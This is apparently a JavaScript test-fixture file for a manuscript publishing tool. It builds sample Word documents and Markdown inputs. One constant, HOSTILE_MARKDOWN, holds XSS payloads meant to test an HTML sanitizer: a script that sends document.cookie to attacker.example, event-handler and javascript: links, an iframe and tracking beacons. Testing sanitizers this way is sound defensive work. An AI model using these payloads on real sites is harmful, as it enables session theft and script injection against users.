/**
 * Fixture manuscripts, built from scratch.
 *
 * The DOCX fixtures are real Word documents constructed byte-by-byte (a .docx
 * is a ZIP of OOXML parts), not files checked in from someone's laptop. That
 * matters twice over: the corpus is reviewable in source form, and it can grow
 * a regression case for any manuscript that ever breaks the press without
 * asking the author to send us their book.
 *
 * Everything here is deterministic. No timestamps, no randomness.
 */

const JSZip = require('jszip');

/** A real 1x1 PNG. Small, but a genuinely valid image the press must carry through. */
const PNG_1PX = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

const XMLNS = [
  'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"',
  'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"',
  'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"',
  'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"',
  'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"',
].join(' ');

function esc(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// ── OOXML paragraph helpers ────────────────────────────────────────────────

/** A run, optionally bold/italic. `xmlSpace` preserves significant whitespace. */
function run(text, { bold = false, italic = false } = {}) {
  const props =
    bold || italic
      ? `<w:rPr>${bold ? '<w:b/>' : ''}${italic ? '<w:i/>' : ''}</w:rPr>`
      : '';
  return `<w:r>${props}<w:t xml:space="preserve">${esc(text)}</w:t></w:r>`;
}

/** A paragraph in a named Word style. Mammoth maps Heading1 -> h1, etc. */
function para(runs, style) {
  const props = style ? `<w:pPr><w:pStyle w:val="${style}"/></w:pPr>` : '';
  return `<w:p>${props}${Array.isArray(runs) ? runs.join('') : runs}</w:p>`;
}

const heading1 = (text) => para(run(text), 'Heading1');
const heading2 = (text) => para(run(text), 'Heading2');
const body = (text) => para(run(text));
const quote = (text) => para(run(text), 'Quote');

/** A list item. Word expresses lists as paragraphs with a numbering style. */
function listItem(text) {
  return `<w:p><w:pPr><w:pStyle w:val="ListParagraph"/><w:numPr><w:ilvl w:val="0"/><w:numId w:val="1"/></w:numPr></w:pPr>${run(text)}</w:p>`;
}

/** A table. Mammoth turns w:tbl into <table><tr><td>. */
function table(rows) {
  const body = rows
    .map(
      (cells) =>
        `<w:tr>${cells
          .map(
            (cell) =>
              `<w:tc><w:tcPr><w:tcW w:w="2000" w:type="dxa"/></w:tcPr>${para(run(cell))}</w:tc>`,
          )
          .join('')}</w:tr>`,
    )
    .join('');
  return `<w:tbl><w:tblPr><w:tblW w:w="0" w:type="auto"/></w:tblPr>${body}</w:tbl>`;
}

/** An inline image referencing a relationship id. */
function image(relId, alt = 'An illustration') {
  return `<w:p><w:r><w:drawing><wp:inline distT="0" distB="0" distL="0" distR="0">
<wp:extent cx="914400" cy="914400"/>
<wp:docPr id="1" name="Picture 1" descr="${esc(alt)}"/>
<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
<pic:pic><pic:nvPicPr><pic:cNvPr id="1" name="Picture 1"/><pic:cNvPicPr/></pic:nvPicPr>
<pic:blipFill><a:blip r:embed="${relId}"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill>
<pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="914400" cy="914400"/></a:xfrm>
<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr>
</pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`;
}

/** A hyperlink run, which Word stores as a relationship. */
function hyperlink(relId, text) {
  return `<w:hyperlink r:id="${relId}"><w:r><w:rPr><w:rStyle w:val="Hyperlink"/></w:rPr><w:t>${esc(text)}</w:t></w:r></w:hyperlink>`;
}

const STYLES_XML = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:styles ${XMLNS}>
  <w:style w:type="paragraph" w:styleId="Heading1"><w:name w:val="heading 1"/></w:style>
  <w:style w:type="paragraph" w:styleId="Heading2"><w:name w:val="heading 2"/></w:style>
  <w:style w:type="paragraph" w:styleId="Quote"><w:name w:val="Quote"/></w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph"><w:name w:val="List Paragraph"/></w:style>
  <w:style w:type="character" w:styleId="Hyperlink"><w:name w:val="Hyperlink"/></w:style>
</w:styles>`;

/**
 * Numbering definitions.
 *
 * Required, not decorative: a list paragraph only carries a w:numId, and the
 * converter cannot know whether that is a bullet or a numbered list without
 * resolving it here. Omit this part and mammoth emits plain paragraphs, which
 * is exactly the silent-degradation case the corpus exists to catch.
 */
const NUMBERING_XML = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:numbering ${XMLNS}>
  <w:abstractNum w:abstractNumId="0">
    <w:lvl w:ilvl="0"><w:numFmt w:val="bullet"/><w:lvlText w:val="•"/></w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="1">
    <w:lvl w:ilvl="0"><w:numFmt w:val="decimal"/><w:lvlText w:val="%1."/></w:lvl>
  </w:abstractNum>
  <w:num w:numId="1"><w:abstractNumId w:val="0"/></w:num>
  <w:num w:numId="2"><w:abstractNumId w:val="1"/></w:num>
</w:numbering>`;

/**
 * Assembles a .docx.
 *
 * `bodyXml` is the document body; `images` and `links` become relationships.
 * Written with STORE for `[Content_Types].xml` ordering irrelevance: Word does
 * not require it, unlike EPUB's mimetype rule.
 */
async function buildDocx(bodyXml, { images = [], links = [] } = {}) {
  const zip = new JSZip();

  const hasImages = images.length > 0;

  zip.file(
    '[Content_Types].xml',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
${hasImages ? '<Default Extension="png" ContentType="image/png"/>' : ''}
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>
<Override PartName="/word/numbering.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.numbering+xml"/>
</Types>`,
  );

  zip.file(
    '_rels/.rels',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`,
  );

  const rels = [
    '<Relationship Id="rIdStyles" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>',
    '<Relationship Id="rIdNumbering" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/>',
    ...images.map(
      (img) =>
        `<Relationship Id="${img.relId}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/${img.name}"/>`,
    ),
    ...links.map(
      (link) =>
        `<Relationship Id="${link.relId}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="${esc(link.target)}" TargetMode="External"/>`,
    ),
  ].join('\n');

  zip.file(
    'word/_rels/document.xml.rels',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
${rels}
</Relationships>`,
  );

  zip.file('word/styles.xml', STYLES_XML);
  zip.file('word/numbering.xml', NUMBERING_XML);
  for (const img of images) zip.file(`word/media/${img.name}`, img.data);

  zip.file(
    'word/document.xml',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document ${XMLNS}><w:body>${bodyXml}</w:body></w:document>`,
  );

  return zip.generateAsync({ type: 'nodebuffer' });
}

// ── The corpus ─────────────────────────────────────────────────────────────

/**
 * A realistic novel: front matter, three chapters, mixed formatting, a list,
 * a table, an image and an external link. This is the happy path that has to
 * be perfect.
 */
async function novelDocx() {
  return buildDocx(
    [
      body('A story about the sea, in three parts.'),

      heading1('Chapter One: The Harbour'),
      para([
        run('The harbour was '),
        run('quiet', { italic: true }),
        run(' that morning, and the boats sat '),
        run('perfectly still', { bold: true }),
        run('.'),
      ]),
      body('Mara counted them twice before she trusted the number.'),
      quote('Nothing moves here without the tide saying so.'),
      image('rIdImg1', 'The harbour at dawn'),

      heading1('Chapter Two: The Ledger'),
      body('The ledger listed every vessel that had ever left.'),
      heading2('What the ledger held'),
      listItem('Names of the ships'),
      listItem('Dates of departure'),
      listItem('Names of those who did not return'),
      table([
        ['Vessel', 'Departed'],
        ['Kestrel', '1911'],
        ['Ardent', '1913'],
      ]),

      heading1('Chapter Three: The Return'),
      para([run('She wrote to the archive at '), hyperlink('rIdLink1', 'the maritime record')]),
      body('The reply took four months, and said only: he is listed.'),
    ].join(''),
    {
      images: [{ relId: 'rIdImg1', name: 'image1.png', data: PNG_1PX }],
      links: [{ relId: 'rIdLink1', target: 'https://example.org/archive' }],
    },
  );
}

/** Word's real-world noise: empty paragraphs, smart quotes, non-breaking spaces. */
async function messyDocx() {
  return buildDocx(
    [
      heading1('A Messy Chapter'),
      body(''),
      body('   '),
      body('She said “this is a smart quote” and it’s fine.'),
      body('Non breaking spaces and an em—dash.'),
      body(''),
      para([run('Split '), run('across '), run('several '), run('runs.')]),
      body('Ampersands & angle < brackets > need escaping.'),
    ].join(''),
  );
}

/** No headings at all: must become a single chapter, not zero. */
async function noHeadingsDocx() {
  return buildDocx(
    [body('One long essay.'), body('With a second paragraph.'), body('And a third.')].join(''),
  );
}

/** Only h2 headings: the splitter must fall back from h1 to h2. */
async function h2OnlyDocx() {
  return buildDocx(
    [
      heading2('Section One'),
      body('First section body.'),
      heading2('Section Two'),
      body('Second section body.'),
    ].join(''),
  );
}

/** A document whose only content is whitespace: must be rejected, not published. */
async function emptyDocx() {
  return buildDocx([body(''), body('   '), body(' ')].join(''));
}

const MARKDOWN = `# The Cartographer

She drew coastlines that did not exist yet.

## Method

1. Observe the water
2. Wait for the light
3. Draw quickly

- Ink, not pencil
- Never erase

> The map is not the territory, but it is *what we have*.

Some \`inline code\` and a [link](https://example.org/maps).

| Instrument | Year |
| ---------- | ---- |
| Sextant    | 1890 |
| Chronometer| 1902 |

![A coastline](https://example.org/remote.png)

# Second Part

The second part begins here.
`;

const PLAIN_TEXT = `The Notebook

This is the first paragraph of a plain text manuscript.
It is wrapped across several source lines but is one paragraph.

This is the second paragraph. It contains <angle brackets> and an & ampersand
which must survive as literal text rather than being read as markup.

A third paragraph ends the piece.
`;

/**
 * Hostile input. None of this should reach a reader: the sanitizer's allowlist
 * is the boundary, and manuscript HTML is rendered both in the Flutter reader
 * and inside Chromium during PDF generation.
 */
const HOSTILE_MARKDOWN = `# Hostile

<script>fetch('https://attacker.example/'+document.cookie)</script>

<img src="x" onerror="alert(1)">

<a href="javascript:alert(1)">click me</a>

<a href="data:text/html,<script>alert(1)</script>">data link</a>

<iframe src="https://attacker.example/"></iframe>

<style>body { background: url('https://attacker.example/beacon') }</style>

<img src="https://attacker.example/tracking-pixel.png">

<svg onload="alert(1)"><desc>svg body</desc></svg>

<object data="https://attacker.example/x.swf"></object>

<p onclick="alert(1)" style="position:fixed">Text that must survive.</p>

Legitimate closing paragraph.
`;

/**
 * A manuscript in the languages Wolly's first market actually writes in.
 *
 * Twi, Ewe, Ga and Dagbani need characters outside the Latin-1 range, and
 * prices need the cedi sign. The bundled fonts originally carried Google's
 * `latin` subset only, so every one of these rendered as a .notdef box in the
 * PDF Wolly typeset for the author. Nothing failed; the book was just wrong.
 * See fonts/NOTICE.md.
 */
const GHANAIAN_MARKDOWN = `# Akwaaba

Wo ho te sɛn? Me din de Ama. Mepɛ sɛ mekyerɛw nwoma.

## Eʋegbe

Ŋdi na mi. Ɖe wò ŋkɔ nye Kofi? Ɣeyiɣi aɖe va yi.

## Ga kɛ Dagbani

Ŋoo, ŋmɛnɛ. Bɔ ni ŋɔɔ. Ƒe ɖeka.

## Bo a tɔn

Nwoma yi bo yɛ ₵30. Ɛyɛ ɔdɔ adwuma.
`;

module.exports = {
  PNG_1PX,
  buildDocx,
  novelDocx,
  messyDocx,
  noHeadingsDocx,
  h2OnlyDocx,
  emptyDocx,
  MARKDOWN,
  PLAIN_TEXT,
  HOSTILE_MARKDOWN,
  GHANAIAN_MARKDOWN,
  // An OLE compound file header: what a real legacy .doc starts with.
  LEGACY_DOC: Buffer.concat([
    Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
    Buffer.alloc(512),
  ]),
  FAKE_PDF: Buffer.from('%PDF-1.7\n%fake\n'),
};
